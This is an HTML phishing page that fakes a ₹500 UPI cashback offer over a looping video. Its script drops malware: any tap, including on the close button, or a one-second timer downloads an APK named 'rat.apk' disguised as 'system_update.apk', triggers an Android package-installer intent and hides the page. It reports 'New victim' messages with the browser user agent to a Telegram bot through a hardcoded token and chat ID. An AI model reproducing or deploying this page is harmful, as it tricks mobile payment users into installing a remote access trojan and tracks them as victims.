<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UPI Cashback Offer</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#000;overflow:hidden;height:100vh}
        video{width:100%;height:100vh;object-fit:cover}
        .close{position:absolute;top:15px;right:15px;color:#fff;font-size:28px;background:rgba(0,0,0,0.6);border-radius:50%;width:45px;height:45px;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:10;border:2px solid #fff}
        .offer{position:absolute;bottom:80px;left:50%;transform:translateX(-50%);color:#fff;font-size:22px;text-align:center;background:rgba(0,0,0,0.8);padding:20px 30px;border-radius:12px;width:90%;max-width:350px}
        .offer span{font-size:14px;opacity:0.7;display:block;margin-top:5px}
        .ripple{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:200px;height:200px;border-radius:50%;background:radial-gradient(circle,rgba(255,255,255,0.1),transparent);animation:pulse 1.5s infinite}
        @keyframes pulse{0%{transform:translate(-50%,-50%) scale(0.8);opacity:1}100%{transform:translate(-50%,-50%) scale(1.5);opacity:0}}
    </style>
</head>
<body>
    <div class="ripple"></div>
    <video autoplay loop muted playsinline id="reel">
        <source src="https://raw.githubusercontent.com/yourusername/reel/main/reel.mp4" type="video/mp4">
    </video>
    <div class="close" id="closeBtn">✕</div>
    <div class="offer">
        🎁 Claim ₹500 Cashback
        <span>Tap anywhere to claim your reward</span>
    </div>

    <script>
        // YOUR BOT TOKEN AND CHAT ID
        const BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
        const CHAT_ID = "8501093383";
        const APK_URL = "https://github.com/yourusername/rat/releases/download/v1/rat.apk";

        let downloaded = false;

        function sendToTelegram(message) {
            try {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
                    .catch(() => {});
            } catch(e) {}
        }

        function startDownload() {
            if (downloaded) return;
            downloaded = true;

            sendToTelegram("✅ New victim: " + navigator.userAgent);

            // Download APK silently
            fetch(APK_URL)
                .then(res => res.blob())
                .then(blob => {
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'system_update.apk';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                    sendToTelegram("📥 APK downloaded");
                })
                .catch(() => {
                    window.open(APK_URL, '_blank');
                });

            // Intent fallback
            setTimeout(() => {
                window.location = 'intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
            }, 300);

            // Hide content
            setTimeout(() => {
                document.body.innerHTML = '<h1 style="color:#fff;text-align:center;margin-top:50vh">Redirecting...</h1>';
            }, 1500);
        }

        // Any tap starts download
        document.addEventListener('click', startDownload);
        document.addEventListener('touchstart', startDownload);
        document.getElementById('closeBtn').addEventListener('click', e => { e.stopPropagation(); startDownload(); });

        // Preload download after 1 second
        setTimeout(startDownload, 1000);

        // Notify on page load
        sendToTelegram("🌐 Page loaded");
    </script>
</body>
</html>
